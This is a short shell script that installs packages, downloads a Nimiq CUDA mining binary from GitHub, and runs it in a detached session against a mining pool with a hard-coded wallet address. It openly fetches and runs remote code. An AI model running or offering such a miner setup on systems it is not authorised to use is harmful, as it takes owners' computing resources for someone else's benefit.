#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS bismillah.sh 65 75
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.1/noncerpro-cuda-linux-3.3.1.tar.gz && tar -xf noncerpro-cuda-linux-3.3.1.tar.gz && ./noncerpro -d=0 -a "NQ48 E87T CY1A PCVT PTJ7 EEJS 786X 6CDX 07J3" -s pool.acemining.co -p 8443 -n x7 -t 4 -i Disable
